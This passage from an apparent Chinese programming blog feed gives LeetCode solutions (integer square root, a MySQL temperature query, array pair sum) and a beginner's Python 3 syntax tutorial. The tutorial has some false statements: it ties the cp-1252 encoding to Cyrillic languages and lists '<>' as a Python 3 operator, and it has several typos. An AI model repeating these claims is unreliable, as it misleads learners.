<p><img src="https://huhansi.github.io/images/2020-03-02-000069-daoshu.gif" alt="导数 "></p>
<p>从几何图形上看，因为导数是切线，通过不断迭代，导数与x轴的交点会不断逼近x0。</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000069-daoshu2.gif" alt="导数图示"></p>
<p>对于一般情况：</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000069-tuidaoguocheng.jpg" alt="推导过程"></p>
<p>将m=2代入：</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000069-qiupingfanggen.jpg" alt="求平方根"></p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mySqrt</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> r = x;</span><br><span class="line">    <span class="keyword">while</span> (r*r &gt; x) &#123;</span><br><span class="line">        r = (r + x/r) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>) r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>二分查找法</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mySqrt</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;  <span class="comment">//二分法</span></span><br><span class="line">    <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> up = x;</span><br><span class="line">    <span class="keyword">while</span>(low &lt;= up)&#123;</span><br><span class="line">        <span class="keyword">long</span> mid = (low + up) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">long</span> s = mid * mid;</span><br><span class="line">        <span class="keyword">if</span>(x == s) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">int</span>) mid;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(x &gt; s) &#123;</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            up = mid -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> up;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><p>因为最后答案肯定是个整数，那么只要找到平方数小于给定值的最大整数即可，这里要考虑到溢出问题，所以在相乘的时候，得用long。</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mySqrt</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> i = <span class="number">0</span>; ;i ++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i * i &gt; x) &#123;</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>197. 上升的温度</title>
    <url>/2018/08/28/LeetCode/leetcode-000197.%20%E4%B8%8A%E5%8D%87%E7%9A%84%E6%B8%A9%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个 <code>Weather</code> 表，编写一个 SQL 查询，来查找与之前（昨天的）日期相比温度更高的所有日期的 Id。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+------------------+------------------+</span><br><span class="line">| Id(INT) | RecordDate(DATE) | Temperature(INT) |</span><br><span class="line">+---------+------------------+------------------+</span><br><span class="line">|       1 |       2015-01-01 |               10 |</span><br><span class="line">|       2 |       2015-01-02 |               25 |</span><br><span class="line">|       3 |       2015-01-03 |               20 |</span><br><span class="line">|       4 |       2015-01-04 |               30 |</span><br><span class="line">+---------+------------------+------------------+</span><br></pre></td></tr></table></figure>
<p>例如，根据上述给定的 <code>Weather</code> 表格，返回如下 Id:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+</span><br><span class="line">| Id |</span><br><span class="line">+----+</span><br><span class="line">|  2 |</span><br><span class="line">|  4 |</span><br><span class="line">+----+</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Write your MySQL query statement below</span><br><span class="line">SELECT w1.Id FROM Weather w1, Weather w2 WHERE w1.Temperature &gt; w2.<span class="function">Temperature AND <span class="title">TO_DAYS</span><span class="params">(w1.RecordDate)</span> </span>= TO_DAYS(w2.RecordDate) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>561.数组拆分 I</title>
    <url>/2018/08/28/LeetCode/leetcode-000561.%20%E6%95%B0%E7%BB%84%E6%8B%86%E5%88%86%20I/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定长度为 <code>2n</code> 的数组, 你的任务是将这些数分成 n 对, 例如 (a1, b1), (a2, b2), …, (an, bn) ，使得从1 到 n 的 min(ai, bi) 总和最大。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,4,3,2]</span><br><span class="line"></span><br><span class="line">输出: 4</span><br><span class="line">解释: n 等于 2, 最大总和为 4 &#x3D; min(1, 2) + min(3, 4).</span><br></pre></td></tr></table></figure>
<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ol>
<li><strong>n</strong> 是正整数,范围在 [1, 10000].</li>
<li>数组中的元素范围在 [-10000, 10000].<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>要使总和最大，那么要第一大的元素和第二大的元素，第三大的元素和第四大的元素配对，以此类推。</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">arrayPairSum</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i += <span class="number">2</span>) &#123;</span><br><span class="line">        	sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>元组内建函数</title>
    <url>/2018/01/17/python/python101/python-7-%E5%85%83%E7%BB%84%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>元组</tag>
      </tags>
  </entry>
  <entry>
    <title>set内建函数</title>
    <url>/2018/01/16/python/python101/python-6-set%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>set</tag>
      </tags>
  </entry>
  <entry>
    <title>字典内建函数</title>
    <url>/2018/01/15/python/python101/python-5-%E5%AD%97%E5%85%B8%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title>list内建函数</title>
    <url>/2018/01/14/python/python101/python-4-list%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>list</tag>
      </tags>
  </entry>
  <entry>
    <title>基本语法</title>
    <url>/2018/01/13/python/python101/python-8-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>默认情况下，Python 3 源码文件以UTF-8编码，所有的字符串都是unicode字符串。当然，也可以为源码文件指定不同的编码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: cp-1252 -*-</span><br></pre></td></tr></table></figure>
<p>上述定义允许在源文件中使用 Windows-1252 字符集中的字符编码，对应适合语言为保加利亚语、白罗斯语、马其顿语、俄语、塞尔维亚语。</p>
<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>标识符是对对象引用起的一个名字。在python中，需要遵循以下规则：</p>
<ol>
<li>长度任意长</li>
<li>不能和python 3的关键字，即保留字，同名</li>
<li>标识符ASCII字母、下划线以及大多数非英文语言的字母，只要是Unicode编码的字母都可以充当引导字符，后续字符可以是任意引导符，或任意非空格字符，包括Unicode编码中认为是数字的任意字符</li>
<li>不要使用Python预定义的标识符名，因此要避免使用NotImplemented与Eliiipsis等名字，这些在未来有可能被Python的新版本使用到</li>
<li>不要使用Python内置函数名或内置数据类型或异常名作为标识符名</li>
<li>关于下划线的约定，名字的开头和结尾都使用下划线的情况应该避免，因为Python中大量采用这种名字定义了各种特殊方法和变量；在有些情况，以一个或两个下划线引导的名称，但是没有使用两个下划线结尾的应该特殊对待</li>
</ol>
<h2 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h2><p>保留字即关键字，不能被用作任何的标识符名称。python的标准库提供了一个keyword模块，可以输出当前版本的所有关键字。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import keyword</span><br><span class="line">keyword.kwlist</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/keyword.PNG" alt="keyword"></p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>python 中有3种注释方式：</p>
<ol>
<li>单行注释以<code>#</code>开头</li>
<li>多行注释用三个单引号<code>&#39;&#39;&#39;</code>，将被注释语句包围起来</li>
<li>多行注释用三个双引号<code>&quot;&quot;&quot;</code>，将被注释语句包围起来<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单行注释</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">这也是多行注释</span></span><br><span class="line"><span class="string">这也是多行注释</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h2><p>python和其他语言最大的区别就是它使用缩进来表示代码块，不需要使用大括号<code>{}</code>。<br>缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进格数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> s:</span><br><span class="line">print(v)</span><br><span class="line"></span><br><span class="line">s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> s:    </span><br><span class="line">    print(v)   <span class="comment"># 缩进四个空格</span></span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E7%BC%A9%E8%BF%9B1.PNG" alt="未缩进"></p>
<p><img src="https://huhansi.github.io/images/%E7%BC%A9%E8%BF%9B2.PNG" alt="缩进"></p>
<h2 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h2><p>Python 通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠()来实现多行语句</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> \</span><br><span class="line">	,<span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">s</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%A4%9A%E8%A1%8C.PNG" alt="多行语句"></p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>python 3 支持一下类型的运算符。</p>
<h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加 两个对象相加</td>
<td>a = 1; b = 2; a + b = 3</td>
</tr>
<tr>
<td>-</td>
<td>减 两个对象相减</td>
<td>a = 1; b = 2; a - b = -1</td>
</tr>
<tr>
<td>*</td>
<td>乘 两个对象相乘</td>
<td>a = 1; b = 2; a * b = 2</td>
</tr>
<tr>
<td>/</td>
<td>除 两个对象相除</td>
<td>a = 1; b = 2; a / b = 0.5</td>
</tr>
<tr>
<td>%</td>
<td>取模 返回除法的余数</td>
<td>a = 1; b = 2; a % b = 1</td>
</tr>
<tr>
<td>**</td>
<td>幂 返回x的y次幂</td>
<td>a = 1; b = 2; a ** b = 1</td>
</tr>
<tr>
<td>//</td>
<td>取整除 返回商的整数部分（向下取整）</td>
<td>a = 1; b = 2; a // b = 0</td>
</tr>
<tr>
<td>### 关系运算符</td>
<td></td>
<td></td>
</tr>
<tr>
<td>运算符</td>
<td>描述</td>
<td>实例</td>
</tr>
<tr>
<td>—-</td>
<td>——–</td>
<td>—————-</td>
</tr>
<tr>
<td>==</td>
<td>等于 比较两个对象是否相等</td>
<td>a = 1; b = 2; a == b false</td>
</tr>
<tr>
<td>！=</td>
<td>不等于 比较两个对象是否不相等</td>
<td>a = 1; b = 2; a ！= b true</td>
</tr>
<tr>
<td>&lt;&gt;</td>
<td>不等于 比较两个对象是否不相等</td>
<td>a = 1; b = 2; a &lt;&gt; b true</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于 返回x是否大于y</td>
<td>a = 1; b = 2; a &gt; b false</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于 返回x是否小于y。</td>
<td>a = 1; b = 2; a &lt; b true</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于 返回x是否大于等于y</td>
<td>a = 1; b = 2; a &gt;= b false</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于 返回x是否小于等于y</td>
<td>a = 1; b = 2; a &lt;= b true</td>
</tr>
<tr>
<td>### 赋值运算符</td>
<td></td>
<td></td>
</tr>
<tr>
<td>运算符</td>
<td>描述</td>
<td>实例</td>
</tr>
<tr>
<td>—-</td>
<td>——–</td>
<td>—————-</td>
</tr>
<tr>
<td>=</td>
<td>赋值运算符</td>
<td>a = 1; b = 2; c = a + b</td>
</tr>
<tr>
<td>+=</td>
<td>加法赋值运算符</td>
<td>c += a 等效于 c = c + a</td>
</tr>
<tr>
<td>-=</td>
<td>减法赋值运算符</td>
<td>c -= a 等效于 c = c - a</td>
</tr>
<tr>
<td>*=</td>
<td>乘法赋值运算符</td>
<td>c *= a 等效于 c = c * a</td>
</tr>
<tr>
<td>/=</td>
<td>除法赋值运算符</td>
<td>c /= a 等效于 c = c / a</td>
</tr>
<tr>
<td>%=</td>
<td>取模赋值运算符</td>
<td>c %= a 等效于 c = c % a</td>
</tr>
<tr>
<td>**=</td>
<td>幂赋值运算符</td>
<td>c *<em>= a 等效于 c = c *</em> a</td>
</tr>
<tr>
<td>//=</td>
<td>取整除赋值运算符</td>
<td>c //= a 等效于 c = c // a</td>
</tr>
<tr>
<td>### 逻辑运算符</td>
<td></td>
<td></td>
</tr>
<tr>
<td>运算符</td>
<td>描述</td>
<td>实例</td>
</tr>
<tr>
<td>—-</td>
<td>——–</td>
<td>—————-</td>
</tr>
<tr>
<td>and</td>
<td>a and b</td>
<td>布尔 <code>与</code>-如果a为False，a and b 返回False，否则它返回b的计算值</td>
</tr>
<tr>
<td>or</td>
<td>a or b</td>
<td>布尔 <code>或</code>-如果a为True，a and b 返回True，否则它返回b的计算值</td>
</tr>
<tr>
<td>not</td>
<td>not a</td>
<td>布尔 <code>非</code>-如果a为True，返回False，如果a为False，它返回True</td>
</tr>
<tr>
<td>### 位运算符</td>
<td></td>
<td></td>
</tr>
<tr>
<td>假设a为60，b为13</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://huhansi.github.io/images/%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6.PNG" alt="位运算符"></p>
<h3 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>in</td>
<td>如果在指定的序列中找到值返回 True，否则返回 False。</td>
<td>x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td>
</tr>
<tr>
<td>not in</td>
<td>如果在指定的序列中没有找到值返回 True，否则返回 False。</td>
<td>x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td>
</tr>
<tr>
<td>### 身份运算符</td>
<td></td>
<td></td>
</tr>
<tr>
<td>运算符</td>
<td>描述</td>
<td>实例</td>
</tr>
<tr>
<td>—-</td>
<td>——–</td>
<td>—————-</td>
</tr>
<tr>
<td>is</td>
<td>is 是判断两个标识符是不是引用自一个对象</td>
<td>x is y, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False</td>
</tr>
<tr>
<td>is not</td>
<td>is not 是判断两个标识符是不是引用自不同对象</td>
<td>x is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td>
</tr>
<tr>
<td>### 运算符优先级</td>
<td></td>
<td></td>
</tr>
<tr>
<td>以下表格给出了从最高到最低优先级的所有运算符</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://huhansi.github.io/images/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7.PNG" alt="运算符优先级"></p>
<h2 id="条件控制"><a href="#条件控制" class="headerlink" title="条件控制"></a>条件控制</h2><p>Python条件语句是通过一条或多条语句的执行结果（True或者False）来决定执行的代码块。<br>可以通过下图来简单了解条件语句的执行过程</p>
<p><img src="https://huhansi.github.io/images/if-condition.jpg" alt="条件语句执行过程"></p>
<h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><p>python中if语句的一般形式如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition_1:</span><br><span class="line">	statement_block_1</span><br><span class="line"><span class="keyword">elif</span> condition_2:</span><br><span class="line">	statement_block_2</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	statement_block_3</span><br></pre></td></tr></table></figure>
<p>· 如果“condition_1”为True，将执行statement_block_1块语句<br>· 如果“condition_2”为False，将判断“condition_2”<br>· 如果“condition_2”为True，将执行statement_block_2块语句<br>· 如果“condition_2”为False，将执行statement_block_3块语句</p>
<p>Python中使用了<code>elif</code> 代替了 <code>else if</code>，所以 <code>if</code>语句的关键字为：<code>if-wlif-else</code>。<br>注意：<br>    · 每个条件后面要使用冒号 :，表示接下来是满足条件后要执行的语句块。<br>    · 使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。<br>    · 在Python中没有switch – case语句。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a = 15</span></span><br><span class="line"><span class="comment"># a = 6</span></span><br><span class="line">a = <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> a &gt; <span class="number">10</span>:</span><br><span class="line">	print(<span class="string">"a is bigger than 10"</span>)</span><br><span class="line"><span class="keyword">elif</span> a &gt; <span class="number">5</span>:</span><br><span class="line">	print(<span class="string">"a is bigger than 5 less than 10"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	print(<span class="string">"a is less than 5"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/if%E7%A4%BA%E4%BE%8B.PNG" alt="if示例"></p>
<h4 id="if-嵌套"><a href="#if-嵌套" class="headerlink" title="if 嵌套"></a>if 嵌套</h4><p>在嵌套 <code>if</code> 语句中，可以把 <code>if...elif...else</code> 结构放在另外一个 <code>if...elif...else</code> 结构中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 表达式<span class="number">1</span>:</span><br><span class="line">    语句</span><br><span class="line">    <span class="keyword">if</span> 表达式<span class="number">2</span>:</span><br><span class="line">        语句</span><br><span class="line">    <span class="keyword">elif</span> 表达式<span class="number">3</span>:</span><br><span class="line">        语句</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        语句</span><br><span class="line"><span class="keyword">elif</span> 表达式<span class="number">4</span>:</span><br><span class="line">    语句</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    语句</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">num = int(input(<span class="string">"输入一个数字："</span>))</span><br><span class="line"><span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> num %<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"你输入的数字可以整除 2 和 3"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"你输入的数字可以整除 2，但不能整除 3"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"你输入的数字可以整除 3，但不能整除 2"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"你输入的数字不能整除 2 和 3"</span>)</span><br></pre></td></tr></table></figure>
<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>Python中的循环语句有for和while。<br>python循环语句的控制结构图如下所示：</p>
<p><img src="https://huhansi.github.io/images/while_loop_1.png" alt="while循环"></p>
<p>while语句的一般形式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 判断条件:</span><br><span class="line">	语句</span><br></pre></td></tr></table></figure>
<p>同样需要注意冒号和缩进。另外，在python中没有<code>do...while</code>循环。<br>以下示例使用了while来计算1到100的总和：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"> </span><br><span class="line">n = <span class="number">100</span></span><br><span class="line"> </span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line">counter = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> counter &lt;= n:</span><br><span class="line">    sum = sum + counter</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">print(<span class="string">"1 到 %d 之和为: %d"</span> % (n,sum))</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/sum.PNG" alt="while循环"></p>
<h4 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h4><p>我们可以通过设置条件表达式永远不为 false 来实现无限循环，实例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">var = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> var == <span class="number">1</span> :  <span class="comment"># 表达式永远为 true</span></span><br><span class="line">   num = int(input(<span class="string">"输入一个数字  :"</span>))</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"你输入的数字是: "</span>, num)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Good bye!"</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本，输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入一个数字  :5</span><br><span class="line">你输入的数字是:  5</span><br><span class="line">输入一个数字</span><br></pre></td></tr></table></figure>
<p>你可以使用 <code>CTRL+C</code> 来退出当前的无限循环。</p>
<p>无限循环在服务器上客户端的实时请求非常有用。</p>
<h4 id="while-循环使用else语句"><a href="#while-循环使用else语句" class="headerlink" title="while 循环使用else语句"></a>while 循环使用else语句</h4><p>在 <code>while … else</code> 在条件语句为 <code>false</code> 时执行 <code>else</code> 的语句块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">   <span class="keyword">print</span> (count, <span class="string">" 小于 5"</span>)</span><br><span class="line">   count = count + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">print</span> (count, <span class="string">" 大于或等于 5"</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本，输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0  小于 5</span><br><span class="line">1  小于 5</span><br><span class="line">2  小于 5</span><br><span class="line">3  小于 5</span><br><span class="line">4  小于 5</span><br><span class="line">5  大于或等于 5</span><br></pre></td></tr></table></figure>
<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。</p>
<p>for循环的一般格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> &lt;variable&gt; <span class="keyword">in</span> &lt;sequence&gt;:</span><br><span class="line">    &lt;statements&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;statements&gt;</span><br></pre></td></tr></table></figure>
<p>Python loop循环实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">languages = [<span class="string">"C"</span>, <span class="string">"C++"</span>, <span class="string">"Perl"</span>, <span class="string">"Python"</span>] </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> languages:</span><br><span class="line">    <span class="keyword">print</span> (x)</span><br><span class="line">C</span><br><span class="line">C++</span><br><span class="line">Perl</span><br><span class="line">Python</span><br></pre></td></tr></table></figure>
<h3 id="break和continue语句及循环中的else子句"><a href="#break和continue语句及循环中的else子句" class="headerlink" title="break和continue语句及循环中的else子句"></a>break和continue语句及循环中的else子句</h3><p>break 语句可以跳出 for 和 while 的循环体。如果你从 for 或 while 循环中终止，任何对应的循环 else 块将不执行。 实例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">'Runoob'</span>:     <span class="comment"># 第一个实例</span></span><br><span class="line">   <span class="keyword">if</span> letter == <span class="string">'b'</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">'当前字母为 :'</span>, letter)</span><br><span class="line">  </span><br><span class="line">var = <span class="number">10</span>                    <span class="comment"># 第二个实例</span></span><br><span class="line"><span class="keyword">while</span> var &gt; <span class="number">0</span>:              </span><br><span class="line">   <span class="keyword">print</span> (<span class="string">'当期变量值为 :'</span>, var)</span><br><span class="line">   var = var <span class="number">-1</span></span><br><span class="line">   <span class="keyword">if</span> var == <span class="number">5</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Good bye!"</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前字母为 : R</span><br><span class="line">当前字母为 : u</span><br><span class="line">当前字母为 : n</span><br><span class="line">当前字母为 : o</span><br><span class="line">当前字母为 : o</span><br><span class="line">当期变量值为 : 10</span><br><span class="line">当期变量值为 : 9</span><br><span class="line">当期变量值为 : 8</span><br><span class="line">当期变量值为 : 7</span><br><span class="line">当期变量值为 : 6</span><br><span class="line">Good bye!</span><br></pre></td></tr></table></figure>
<p>continue语句被用来告诉Python跳过当前循环块中的剩余语句，然后继续进行下一轮循环。</p>
